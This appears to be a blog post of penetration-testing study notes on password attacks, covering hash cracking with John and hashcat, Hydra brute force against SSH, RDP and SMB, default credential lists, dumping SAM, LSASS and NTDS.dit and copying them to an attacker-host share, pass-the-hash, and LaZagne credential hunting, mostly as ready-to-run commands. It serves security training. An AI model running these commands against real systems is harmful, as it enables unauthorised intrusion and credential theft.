---
title: "8 password attacks"
description: "Stolen, weak and reused passwords are the leading cause of hacking-related data breaches and a tried-and-true way of gaining access to the enterprise's IT resources"
pubDate: "April 08 2025"
heroImage: "/p.jpg"
---

# **1.Theory of Protection:**

### **The CIA Triad: Core Security Principles**

Every cybersecurity professional focuses on three key principles:

1. **Confidentiality** – Keeping data private and accessible only to authorized users.
2. **Integrity** – Ensuring data is accurate and not tampered with.
3. **Availability** – Making sure systems and data are accessible when needed.

To maintain this balance, we use three key security processes:

- **Authentication** – Verifying a user’s identity.
- **Authorization** – Granting the correct level of access.
- **Accounting (Auditing)** – Tracking user actions and system changes.

Most security breaches occur when one of these principles is compromised.

### **Authentication: Proving Your Identity**

Authentication verifies **who you are** using one or more of these factors:

1. **Something you know** – Passwords, PINs, or security answers.
2. **Something you have** – ID cards, security keys, or authentication apps.
3. **Something you are** – Biometrics like fingerprints, facial recognition, or retina scans.

More sensitive systems (e.g., hospital databases) require multiple factors for stronger security.

Example: A doctor may need a security card (something they have) and a PIN (something they know) to log in.

For everyday logins (like email), we commonly use:

- Username + Password (basic authentication).
- Password + 2FA code (stronger security).
- Password + Biometric (even stronger).

If a hacker steals a password, they might still be stopped by **multi-factor authentication (MFA)**.

### **Passwords: The Most Common Authentication Method**

A password is a secret string of letters, numbers, and symbols used to verify identity.

Example: A simple 8-character password (uppercase letters + numbers) has **208 billion** possible combinations.

**What makes a good password?**

- Longer and more complex is better.
- Passphrases (e.g., **TreeDogEvilElephant**) are easier to remember but harder to crack.
- Randomly generated passwords offer the best security.

However, passwords alone **aren’t enough**—many people use weak passwords or reuse them across accounts.

### **Weak Passwords: A Hacker’s Goldmine**

Studies show that many people use predictable passwords:

- **24%** use weak passwords like "password," "123456," or "qwerty."
- **22%** use their own name.
- **33%** use their pet’s or child’s name.
- **66%** reuse passwords across multiple sites.

💡 **Why is password reuse dangerous?**

If a hacker gets **one** of your passwords, they can try it on other accounts (called **credential stuffing**).

### **The Problem with Data Breaches**

- Only **45%** of users change their passwords after a breach.
- Websites like [HaveIBeenPwned](https://haveibeenpwned.com/) can check if your email has been exposed in breaches.

💡 **Tip:** Always use **unique passwords** and **enable 2FA** on important accounts.

# **2.Credential Storage Overview**

- Authentication mechanisms compare credentials with local or remote databases.
- Local databases store credentials on the system, making them vulnerable to attacks (e.g., SQL injection).
- Wordlists, such as *rockyou.txt*, contain commonly used passwords leaked from data breaches.

### **Linux Credential Storage**

**Password Storage:**

- Stored in `/etc/shadow` (encrypted format).
- `/etc/passwd` contains user information but no passwords (previously a security risk).
- Password format: `$<id>$<salt>$<hashed_password>`

**Hashing Algorithms Used:**

- `$1$` → MD5
- `$2a$` → Blowfish
- `$5$` → SHA-256
- `$6$` → SHA-512
- `$y$` → Yescrypt
- `$7$` → Scrypt

**Security Considerations:**

- `/etc/shadow` can only be accessed by `root`.
- Misconfigured file permissions can lead to privilege escalation.

### **Windows Credential Storage**

**Authentication Process:**

- **Winlogon**: Manages logins and interacts with credential providers.
- **LSASS (Local Security Authority Subsystem Service)**: Handles authentication and security policies.
- **SAM (Security Account Manager)**: Stores password hashes (LM & NTLM).
- **NTDS.dit**: Stores Active Directory credentials in domain environments.

**Key Authentication Modules:**

- `Msv1_0.dll`: Used for non-domain interactive logins.
- `Samsrv.dll`: Manages local user accounts.
- `Kerberos.dll`: Handles Kerberos authentication.
- `Netlogon.dll`: Supports network-based logins.

**Credential Manager:**

- Stores user credentials for network resources and websites.
- Location: `C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]`
- Can be decrypted using specific methods.

**Security Enhancements:**

- `SYSKEY`: Introduced in Windows NT 4.0 to encrypt the SAM database.
- Domain-joined systems store credentials in `NTDS.dit`, synchronized across Domain Controllers.

# **3.John the Ripper (JTR) Overview**

- **John the Ripper (JTR or John)** is a pentesting tool for checking password strength and cracking encrypted (hashed) passwords via brute force or dictionary attacks.
- Initially developed for UNIX-based systems, first released in 1996, and now widely used by security professionals.
- The **Jumbo variant** is recommended for security professionals due to performance optimizations, multilingual word lists, and support for 64-bit architectures.

### **Capabilities**

- Supports **various encryption technologies**.
- Can convert different file types and hashes into a format usable by John.
- Regular updates ensure compatibility with modern security trends.

### **Encryption Technologies Supported**

| **Encryption Technology** | **Description** |
| --- | --- |
| UNIX crypt(3) | Traditional UNIX encryption system with a 56-bit key. |
| DES-based encryption | Uses the Data Encryption Standard algorithm. |
| bigcrypt | Extension of DES-based encryption, 128-bit key. |
| BSDI extended DES | Extended DES encryption, 168-bit key. |
| FreeBSD MD5-based | Uses the MD5 algorithm, 128-bit key (Linux & Cisco). |
| OpenBSD Blowfish-based | Uses the Blowfish algorithm, 448-bit key. |
| Kerberos/AFS | Authentication systems that use encryption for secure communication. |
| Windows LM | Uses the DES algorithm, 56-bit key. |
| DES-based tripcodes | Authentication system based on DES encryption. |
| SHA-crypt hashes | 256-bit key, used in modern Fedora and Ubuntu. |
| SHA-crypt & SUNMD5 (Solaris) | Uses SHA-crypt and MD5 algorithms, 256-bit key. |

### **Attack Methods**

### **1. Dictionary Attacks**

- Uses a **pre-generated list** of words and phrases (a "dictionary") to guess passwords.
- Sources: leaked passwords, public dictionaries, specialized wordlists.
- Preventive Measures:
    - Use **complex and unique** passwords.
    - Regularly **change passwords**.
    - Enable **two-factor authentication (2FA)**.

### **2. Brute Force Attacks**

- Tries **every possible character combination** until the correct password is found.
- Time-consuming, but effective against weak passwords.
- Strong passwords (8+ characters, mix of letters, numbers, symbols) **increase resistance**.

### **3. Rainbow Table Attacks**

- Uses **precomputed tables** of password hashes to speed up cracking.
- Limited by **table size** – can only crack hashes present in the table.

### **Cracking Modes in John the Ripper**

### **1. Single Crack Mode**

- Tries passwords from a **single list** in a brute-force manner.
- Example:

Example for cracking SHA-256 hashes:
    
    john --format=<hash_type> <hash or hash_file>
    
    
- **Outputs cracked passwords** to the console and `john.pot` file.

### **2. Wordlist Mode**

- Uses **multiple wordlists** to try different password guesses.
- Example:
    
    ```bash
    john --wordlist=<wordlist_file> --rules <hash_file>
    ```
    
- Wordlists can be **customized** to increase effectiveness.

### **3. Incremental Mode**

- Tries **all possible character combinations** from a specified character set.
- Example:
    
    ```bash
    john --incremental <hash_file>
    ```
    
- **Highly resource-intensive** but effective for weak passwords.
- The default character set is **a-zA-Z0-9** (can be customized).

### **Cracking Hashes with John the Ripper**

John supports various hash formats:

| **Hash Format** | **Example Command** | **Description** |
| --- | --- | --- |
| AFS | `john --format=afs hashes_to_crack.txt` | AFS (Andrew File System) hashes |
| Blowfish | `john --format=bf hashes_to_crack.txt` | Blowfish-based crypt(3) hashes |
| BSDi | `john --format=bsdi hashes_to_crack.txt` | BSDi crypt(3) hashes |
| MD5 | `john --format=raw-md5 hashes_to_crack.txt` | Raw MD5 password hashes |
| NTLM | `john --format=nt hashes_to_crack.txt` | NT (Windows NT) password hashes |
| MySQL SHA1 | `john --format=mysql-sha1 hashes_to_crack.txt` | MySQL SHA1 password hashes |
| PDF | `john --format=pdf hashes_to_crack.txt` | PDF (Portable Document Format) password hashes |
| ZIP | `john --format=zip hashes_to_crack.txt` | ZIP (WinZip) password hashes |

### **Cracking Encrypted Files with John**

- John can **crack password-protected or encrypted files** using helper tools to extract hashes.
- Example process:

Example for cracking a **PDF file**:
    
    ```bash
    <tool> <file_to_crack> > file.hash
    john file.hash
    ```
    
    ```bash
    pdf2john secure_doc.pdf > secure_doc.hash
    john secure_doc.hash
    ```
    

### **Common Tools for File Hash Extraction**

| **Tool** | **Description** |
| --- | --- |
| `pdf2john` | Extracts hashes from PDF documents. |
| `ssh2john` | Extracts hashes from SSH private keys. |
| `rar2john` | Extracts hashes from RAR archives. |
| `zip2john` | Extracts hashes from ZIP archives. |
| `office2john` | Extracts hashes from MS Office documents. |
| `keepass2john` | Extracts hashes from KeePass databases. |
| `vncpcap2john` | Converts VNC PCAP files for John |
| `putty2john` | Extracts hashes from PuTTY private keys. |
| `hccap2john` | Extracts hashes from WPA/WPA2 handshake captures. |
| `wpa2john` | Extracts hashes from WPA/WPA2 handshakes. |

To **list all available tools** on a Linux system:

```bash
locate *2john*
```

# **4.Network Services Overview**

## Common Network Services

- **FTP, SMB, NFS**: File transfer/sharing
- **IMAP/POP3**: Email retrieval
- **SSH**: Secure remote access
- **MySQL/MSSQL**: Database services
- **RDP, WinRM, VNC**: Remote desktop/management
- **Telnet**: Legacy remote access
- **SMTP**: Email sending
- **LDAP**: Directory services

## WinRM (Windows Remote Management)

- Microsoft's implementation of WS-Management protocol
- XML-based SOAP protocol for remote Windows management
- Links WBEM and WMI, can call DCOM
- Ports: 5985 (HTTP), 5986 (HTTPS)
- Must be manually activated in Windows 10

### Tools for WinRM

### CrackMapExec

- Multi-protocol testing tool (SMB, LDAP, MSSQL, WinRM)
- Installation: `sudo apt-get -y install crackmapexec`
- Usage: `crackmapexec winrm 10.129.42.197 -u user.list -p password.list`
- "Pwn3d!" message indicates command execution is likely possible

### Evil-WinRM

- Specialized tool for WinRM interaction
- Installation: `sudo gem install evil-winrm`
- Usage: `evil-winrm -i 10.129.42.197 -u user -p password`
- Uses Powershell Remoting Protocol for command execution

## SSH (Secure Shell)

- Secure remote host connection (TCP port 22)
- Uses three cryptography methods:
    - **Symmetric Encryption**: Same key for encryption/decryption (uses Diffie-Hellman key exchange)
    - **Asymmetric Encryption**: Public/private key pairs
    - **Hashing**: One-way validation of data integrity

### SSH Brute Force

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

### SSH Connection

```bash
ssh user@10.129.42.197
```

## RDP (Remote Desktop Protocol)

- Microsoft protocol for remote system access (TCP port 3389)
- Allows full GUI control of remote Windows systems
- Can share peripherals (printers, storage) between systems

### RDP Brute Force

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

### RDP Connection (Linux)

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```

## SMB (Server Message Block)

- Protocol for file/directory sharing and printing in Windows networks
- Also known as CIFS (Common Internet File System)
- Samba is an open-source implementation for cross-platform use

### SMB Brute Force

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

### Alternative: Using Metasploit

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

### Enumerating SMB Shares

```bash
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

### Accessing SMB Shares

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

## Key Points

- Most services authenticate using username/password
- Alternative authentication methods include certificates and keys
- Many tools can automate testing of authentication mechanisms
- For testing SMBv3, updated tools may be required

# 5.Password Mutations

## Password Policy Issues

- Users tend to create simple passwords instead of secure ones
- Password policies enforce complexity requirements:
    - Minimum length (typically 8 characters)
    - Capital letters
    - Special characters
    - Numbers
- Despite policies, users still create predictable passwords

## Common Password Patterns

```
DescriptionExampleFirst letter capitalizedPasswordAdding numbersPassword123Adding yearPassword2022Adding monthPassword02Ending with exclamation markPassword2022!Using special charactersP@ssw0rd2022!
```

## Password Creation Tendencies

- Most passwords are under 10 characters long
- Users often incorporate:
    - Company names
    - Personal interests
    - Pet names
    - Hobbies
    - Current year/month
- When forced to change passwords, users make minimal changes

## Hashcat for Password Mutation

- Powerful tool for creating custom wordlists through mutation rules
- Common rule functions:
    - `:` - Do nothing
    - `l` - Lowercase all letters
    - `u` - Uppercase all letters
    - `c` - Capitalize first letter
    - `sXY` - Replace X with Y
    - `$!` - Add exclamation mark at end

## Creating Custom Rule Files

```
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

## Generating Mutated Wordlists

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

## Pre-built Hashcat Rules

- Located in `/usr/share/hashcat/rules/`
- `best64.rule` is commonly used with good results
- Many specialized rules available for different scenarios

## Website Wordlist Generation with CeWL

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

- Parameters:
    - `d 4`: Spider depth
    - `m 6`: Minimum word length
    - `-lowercase`: Store words in lowercase
    - `w`: Output file

## Effective Password Guessing Strategy

- Combine company-specific terms with mutation rules
- Consider geographical region and industry
- Use OSINT to gather information about user preferences
- Targeted guessing is more efficient than random attempts

# 6.Password Reuse / Default Passwords

## Common Password Management Issues

- Administrators often leave default credentials unchanged
- Same passwords frequently used across multiple systems
- Internal applications particularly vulnerable (assumption of security through obscurity)
- Easy-to-remember passwords preferred over complex ones
- Single-Sign-On (SSO) not always available during initial setup

## Default Credentials

- Many applications ship with default username/password combinations
- Default credentials are documented in product manuals
- Large infrastructures increase risk of overlooked devices
- Network devices like routers, printers, and firewalls commonly affected

## Default Credentials Resources

- DefaultCreds-Cheat-Sheet maintains lists of known default logins
- Examples:
    
    
    | Product/Vendor | Username | Password |
    | --- | --- | --- |
    | Zyxel (ssh) | zyfwp | PrOw!aN_fXp |
    | APC UPS (web) | apc | apc |
    | Weblogic (web) | system | manager |
    | Kali Linux | kali | kali |
    | F5 | admin | admin |
    | F5 | root | default |

## Router Default Credentials

- Many routers have known default logins
- Example router defaults:
    
    
    | Router Brand | Default IP | Default Username | Default Password |
    | --- | --- | --- | --- |
    | 3Com | 192.168.1.1 | admin | Admin |
    | Belkin | 192.168.2.1 | admin | admin |
    | D-Link | 192.168.0.1 | admin | Admin |
    | Netgear | 192.168.0.1 | admin | password |

## Credential Stuffing

- Attack using known username/password combinations
- Simplified variant of brute-forcing
- Uses composite credentials (username:password format)
- Can mutate known passwords to increase success probability

## Credential Stuffing with Hydra

```bash
hydra -C user_pass.list ssh://10.129.42.197
```

## OSINT in Password Attacks

- Helps understand company infrastructure
- Provides insight for creating targeted username/password combinations
- Google searches can reveal hardcoded credentials in applications

## Key Risk Factors

- Large network infrastructures with hundreds of interfaces
- Test environments with minimal security measures
- Overlooked devices in network corners
- Documentation that reveals default credentials

# 7.Attacking SAM

## Overview of SAM Attacks

- SAM (Security Account Manager) database contains local user account credentials
- Attacking SAM involves dumping registry hives to crack passwords offline
- Useful when you have local admin access on non-domain joined Windows systems

## Important Registry Hives

- **HKLM\sam**: Contains hashes for local account passwords
- **HKLM\system**: Contains system bootkey used to decrypt the SAM database
- **HKLM\security**: Contains cached credentials for domain accounts (useful on domain-joined systems)

## Dumping Registry Hives

1. Run CMD as admin
2. Use reg.exe to save copies:
    
    ```
    reg.exe save hklm\sam C:\sam.savereg.exe save hklm\system C:\system.savereg.exe save hklm\security C:\security.save
    
    ```
    

## Transferring Hive Files

1. Create SMB share on attack host:
    
    ```
    sudo python3 /path/to/smbserver.py -smb2support SHARE_NAME /path/to/directory
    
    ```
    
2. Move files from target to share:
    
    ```
    move sam.save \\ATTACK_IP\SHARE_NAMEmove security.save \\ATTACK_IP\SHARE_NAMEmove system.save \\ATTACK_IP\SHARE_NAME
    
    ```
    

## Extracting Hashes with secretsdump.py

```
python3 /path/to/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

```

- Output format: username:RID:LM hash:NT hash
- Modern Windows systems use NT hashes

## Cracking Hashes with Hashcat

1. Save NT hashes to a text file
2. Run hashcat with mode 1000 (for NT/NTLM):
    
    ```
    hashcat -m 1000 hashestocrack.txt /path/to/wordlist.txt
    
    ```
    

## Remote Dumping Methods

- Using CrackMapExec to dump LSA secrets:
    
    ```
    crackmapexec smb TARGET_IP --local-auth -u USERNAME -p PASSWORD --lsa
    
    ```
    
- Dumping SAM remotely:
    
    ```
    crackmapexec smb TARGET_IP --local-auth -u USERNAME -p PASSWORD --sam
    
    ```
    

## Security Notes

- This is a known technique that may be detected by monitoring tools
- Requires local admin access to execute successfully

# 8.Attacking LSASS

## Overview of LSASS

- **LSASS** (Local Security Authority Subsystem Service) is a critical Windows service for credential management
- LSASS functions:
    - Caches credentials in memory
    - Creates access tokens
    - Enforces security policies
    - Writes to Windows security log

## LSASS Dumping Methods

### Task Manager Method

1. Open Task Manager > Processes tab
2. Find & right-click "Local Security Authority Process"
3. Select "Create dump file"
4. Dump file saved to: `C:\Users\[username]\AppData\Local\Temp\lsass.DMP`

### Rundll32.exe & Comsvcs.dll Method

1. Find LSASS PID:
    - CMD: `tasklist /svc` (find lsass.exe PID)
    - PowerShell: `Get-Process lsass` (see Id field)
2. Create dump file using PowerShell (elevated):
    
    ```
    rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] C:\lsass.dmp
    
    ```
    
3. Note: Modern AV tools often detect and block this method

## Extracting Credentials with Pypykatz

1. Transfer the dump file to attack host
2. Run pypykatz:
    
    ```
    pypykatz lsa minidump /path/to/lsass.dmp
    
    ```
    
3. Pypykatz extracts multiple credential types:

### MSV Authentication

- SID, username, domain
- NT and SHA1 password hashes

### WDIGEST

- Stores credentials in clear-text on older Windows systems (XP-8, Server 2003-2012)
- Modern Windows systems have WDIGEST disabled by default

### Kerberos

- Authentication protocol used in Windows Domain environments
- LSASS caches passwords, ekeys, tickets, and pins
- Can be used to access other domain-joined systems

### DPAPI (Data Protection API)

- Used by Windows for encrypting/decrypting sensitive data
- Applications using DPAPI:
    - Internet Explorer/Chrome (saved passwords)
    - Outlook (email account passwords)
    - Remote Desktop Connection (saved credentials)
    - Credential Manager (shared resources, WiFi, VPN credentials)
- Extractable masterkey can decrypt application secrets

## Cracking the NT Hash

```
hashcat -m 1000 [NT_HASH] /path/to/wordlist.txt

```

## Security Considerations

- This technique is often detected by modern security solutions
- Requires administrative privileges on the target system

# 9.Active Directory & NTDS.dit Attack Methods

## Active Directory Overview

- AD is a critical directory service in enterprise networks
- If an organization uses Windows, it likely uses AD to manage systems
- Most attacks require internal network access or specific port forwarding

## Authentication Process

- Domain-joined systems validate logon requests through domain controllers
- Local SAM database can still be used with specific syntax: `hostname/username` or `./` at logon

## Dictionary Attacks Against AD

### Username Considerations

- Common naming conventions:
    - First initial + last name (jdoe)
    - First initial + middle initial + last name (jjdoe)
    - First name + last name (janedoe)
    - First name + period + last name (jane.doe)
    - Last name + period + first name (doe.jane)
    - Nicknames

### Creating Username Lists

- Research employee names from publicly available information
- Check email formats (username@domain.com)
- Tools like Username Anarchy can generate common formats automatically

### Attack Execution with CrackMapExec

```
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

```

- Uses SMB protocol to send logon requests
- Can potentially lock out accounts if policy is configured
- Leaves event logs that security teams can analyze

## NTDS.dit Extraction

### What is NTDS.dit?

- NT Directory Services (NTDS) database file
- Stored at %systemroot%/ntds on domain controllers
- Contains all domain usernames, password hashes, and schema information
- Compromising this file can compromise the entire domain

### Manual Extraction Method

1. Connect to DC using compromised credentials (Evil-WinRM)
2. Check local group membership to verify admin rights
3. Create Volume Shadow Copy (VSS) of C: drive:
    
    ```
    vssadmin CREATE SHADOW /For=C:
    
    ```
    
4. Copy NTDS.dit from shadow copy:
    
    ```
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\NTDS\
    
    ```
    
5. Transfer file to attack host using SMB share

### Faster Extraction with CrackMapExec

```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

```

- Single command leverages VSS to capture and dump NTDS.dit
- Outputs username:hash pairs directly in terminal

## Utilizing Password Hashes

### Hash Cracking with Hashcat

```
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

```

- Mode 1000 for NTLM hashes
- Attempts to convert hashes to cleartext passwords

### Pass-the-Hash Attacks

- Uses NTLM authentication to authenticate with hash instead of password
- Format: `username:password hash`
- Example with Evil-WinRM:
    
    ```
    evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
    
    ```
    
- Useful for lateral movement after initial compromise
- Requires no password cracking

# 10.Credential Hunting in Windows

## Scenario Context

- Process involves detailed searches across the file system and applications
- Example scenario: Gained RDP access to an IT admin's Windows 10 workstation

## Search Strategy

### Leveraging Search Features

- Most applications and OS have built-in search functionality
- Target search based on system usage context (e.g., IT admin daily tasks)
- Focus on files that might contain documented passwords or default credentials

### Effective Search Terms

- Passwords, Passphrases, Keys
- Username, User account, Creds
- Users, Passkeys
- Configuration, dbcredential, dbpassword
- pwd, Login, Credentials

## Search Tools and Methods

### Windows Search

- Default OS search tool
- Searches both OS settings and file system
- Accessible via the search bar

### Lazagne Tool

1. Transfer standalone Lazagne.exe to target system
2. Execute via command prompt: `start lazagne.exe all`
3. Add `vv` option for detailed execution information
4. Reveals credentials stored insecurely by applications

### Example Lazagne Output:

```
|====================================================================|
|                                                                    |
|                          The LaZagne Project                       |
|                                                                    |
|                            ! BANG BANG !                           |
|                                                                    |
|====================================================================|

########## User: bob ##########

------------------- Winscp passwords -----------------
[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22

```

### Using findstr Command

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

```

- Searches for patterns across multiple file types
- Customizable for different search terms

## Additional Credential Locations

- Passwords in Group Policy in SYSVOL share
- Passwords in scripts in SYSVOL share
- Passwords in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml files
- AD user or computer description fields
- KeePass databases (can be cracked)
- Common files like pass.txt, passwords.docx, passwords.xlsx
- User systems, network shares, and Sharepoint